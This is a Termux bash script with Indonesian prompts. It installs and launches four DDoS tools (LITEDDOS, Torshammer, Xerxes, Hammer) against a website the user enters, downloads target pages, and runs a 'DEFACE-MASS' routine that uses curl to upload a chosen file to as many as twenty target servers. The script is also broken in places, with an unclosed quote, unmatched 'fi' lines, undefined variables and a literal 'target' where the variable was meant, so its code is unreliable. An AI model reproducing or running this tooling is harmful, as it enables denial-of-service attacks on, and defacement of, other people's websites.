#!/system/xbin/bash
#Author InYouDfv47
#Selamat Belajar

clear
blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'    

figlet Dfv47 | lolcat
echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
echo $green"Daftar Toolsnya=>"
echo $purple"[1] DDOS Website Dengan LITEDDOS"
echo $purple"[2] DDOS Website Dengan Torshammer"
echo $purple"[3] DDOS Website Dengan Xerxes"
echo $purple"[4] DDOS Website Dengan Hammer"
echo
echo $green
read -p "╭─[Pilih Nomer]
╰─root@Dfv47=•>" bro

if [ $bro = 1 ] || [ $bro = 1 ]
then
clear
echo $green"Installing LITEDDOS..."
sleep 1
apt update
apt install git
git clone https://github.com/4L13199/LITEDDOS
mv LITEDDOS $HOME
cd $HOME/LITEDDOS
read -p "MasukanTarget:" target
python2 LITEDDOS.py target 80 100
fi

if [ $bro = 2 ] || [ $bro = 2 ]
then
clear
echo $green"Installing.....
apt update
apt install git
git clone https://github.com/dotfighter/torshammer.git
mv torshammer $HOME
cd $HOME/torshammer
read -p "Masukan Target:" target
python2 torshammer.py -T -t target
fi

if [ $bro = 3 ] || [ $bro = 3 ]
then
clear
echo $green"Installing Xerxes DDOS..."
sleep 1
apt update && apt upgrade
apt install git
apt install clang
git clone https://github.com/zanyarjamal/xerxes
mv xerxes $HOME
cd $HOME/xerxes
clang xerxes.c -o xerxes
clear
read -p "[masukanWebsiteTarget]>" target
./xerxes target 80
fi

if [ $bro = 4 ] || [ $bro = 5 ]
then
clear
echo $green" Installing Hammer DDOS.."
sleep 1
git clone https://github.com/cyweb/hammer
mv hammer $HOME
cd $HOME/hammer
read -p "Masukan Target:" target
python2 hammer.py -T -t target
fi

figlet -f shadow Nyolong
echo $green "Masukan Target !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  target
echo $green "Simpan dengan nama??(ex: script.html)"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " simpan
curl -o $simpan $target
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "C" ] || [ $apaan = "c" ]
then
echo $yellow
figlet -f smshadow "DEFACE-MASS"
figlet -f smshadow "EXPLOIT"
echo "### ctrl + c to quit ###"
echo "Masukan Script !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white                               
read -p " ╰─$ " script
echo "Masukan Target1 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target1
curl -T /storage/emulated/0/$script $target1
echo $cyan"["$green"+"$cyan"]"$red"$target1/$script"
echo "Masukan Target2 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target2
curl -T /storage/emulated/0/$script $target2
echo $cyan"["$green"+"$cyan"]"$red"$target2/$script"
echo "Masukan Target3 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target3
curl -T /storage/emulated/0/$script $target3
echo $cyan"["$green"+"$cyan"]"$red"$target3/$script"
echo "Masukan Target4 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target4
curl -T /storage/emulated/0/$script $target4
echo $cyan"["$green"+"$cyan"]"$red"$target4/$script"
echo "Masukan Target5 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target5
curl -T /storage/emulated/0/$script $target5
echo $cyan"["$green"+"$cyan"]"$red"$target5/$script"
echo "Masukan Target6 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target6
curl -T /storage/emulated/0/$script $target6
echo $cyan"["$green"+"$cyan"]"$red"$target6/$script"
echo "Masukan Target7 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target7
curl -T /storage/emulated/0/$script $target7
echo $cyan"["$green"+"$cyan"]"$red"$target7/$script"
echo "Masukan Target8 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target8
curl -T /storage/emulated/0/$script $target8
echo $cyan"["$green"+"$cyan"]"$red"$target8/$script"
echo "Masukan Target9 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target9
curl -T /storage/emulated/0/$script $target9
echo $cyan"["$green"+"$cyan"]"$red"$target9/$script"
echo "Masukan Target10 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target10
curl -T /storage/emulated/0/$script $target10
echo $cyan"["$green"+"$cyan"]"$red"$target10/$script"
echo "Masukan Target11 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target11
curl -T /storage/emulated/0/$script $target11
echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
echo "Masukan Target12 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target12
curl -T /storage/emulated/0/$script $target12
echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
echo "Masukan Target13 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target13
curl -T /storage/emulated/0/$script $target13
echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
echo "Masukan Target14 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target14
curl -T /storage/emulated/0/$script $target14
echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
echo "Masukan Target15 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target15
curl -T /storage/emulated/0/$script $target15
echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
echo "Masukan Target16 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target16
curl -T /storage/emulated/0/$script $target16
echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
echo "Masukan Target17 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target17
curl -T /storage/emulated/0/$script $target17
echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
echo "Masukan Target18 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target18
curl -T /storage/emulated/0/$script $target18
echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
echo "Masukan Target19 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target19
curl -T /storage/emulated/0/$script $target19
echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
echo "Masukan Target20 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target20
curl -T /storage/emulated/0/$script $target20
echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi